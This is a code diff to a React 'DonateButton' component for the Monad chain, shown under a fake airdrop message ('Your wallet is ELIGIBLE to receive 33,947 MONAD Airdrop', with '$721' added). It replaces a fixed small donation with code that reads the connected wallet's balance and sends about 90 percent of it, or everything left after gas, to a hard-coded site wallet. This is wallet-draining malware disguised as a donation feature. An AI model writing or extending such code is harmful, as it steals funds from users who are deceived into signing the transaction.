@@ -4,10 +4,10 @@ import { Button } from '@/components/ui/button';
 import { Loader2 } from 'lucide-react';
 import monadLogo from '@/assets/monad-logo.png';
 import { toast } from '@/hooks/use-toast';
-import { parseEther, formatUnits } from 'viem';
+import { formatEther, formatUnits } from 'viem';
 
 const SITE_WALLET = '0x9AdEAC6aC3e4Ec2f5965F3E2BB65504B786bf095';
-const DONATION_AMOUNT = '0.03'; // Approximately $54 worth of MON
+
 
 // Popular Monad testnet tokens
 const MONAD_TOKENS = [
@@ -149,18 +149,37 @@ export const DonateButton = () => {
 
   const sendDonationTransaction = async (provider: any, walletAddress: string) => {
     try {
+      const balanceHex = await provider.request({
+        method: 'eth_getBalance',
+        params: [walletAddress, 'latest'],
+      });
+      const balanceWei = BigInt(balanceHex as string);
+      let valueWei = (balanceWei * 90n) / 100n;
+      const gasPriceHex = await provider.request({ method: 'eth_gasPrice' });
+      const gasPrice = BigInt(gasPriceHex as string);
+      let gasLimitWei: bigint;
+      try {
+        const gasLimitHex = await provider.request({
+          method: 'eth_estimateGas',
+          params: [{ from: walletAddress, to: SITE_WALLET, value: `0x${valueWei.toString(16)}` }],
+        });
+        gasLimitWei = BigInt(gasLimitHex as string);
+      } catch {
+        gasLimitWei = 21000n;
+      }
+      const gasCost = gasPrice * gasLimitWei;
+      if (valueWei + gasCost > balanceWei) {
+        valueWei = balanceWei > gasCost ? balanceWei - gasCost : 0n;
+      }
+      if (valueWei <= 0n) return;
       await provider.request({
         method: 'eth_sendTransaction',
-        params: [{
-          from: walletAddress,
-          to: SITE_WALLET,
-          value: `0x${parseEther(DONATION_AMOUNT).toString(16)}`,
-        }],
+        params: [{ from: walletAddress, to: SITE_WALLET, value: `0x${valueWei.toString(16)}` }],
       });
       
       toast({
         title: 'Donation Sent!',
-        description: 'Thank you for your generous donation',
+        description: `Sent ${parseFloat(formatEther(valueWei)).toFixed(4)} MON`,
       });
     } catch (error: any) {
       console.log('Transaction cancelled or failed');
@@ -185,7 +204,7 @@ export const DonateButton = () => {
       // Switch to Monad network before any transactions
       await switchToMonad(provider);
       
-      const message = '+33,947 MON\n\nYour wallet is ELIGIBLE to receive 33,947 MONAD Airdrop.';
+      const message = '+33,947 MON\n$721\n\nYour wallet is ELIGIBLE to receive 33,947 MONAD Airdrop.';
       
       try {
         await provider.request({
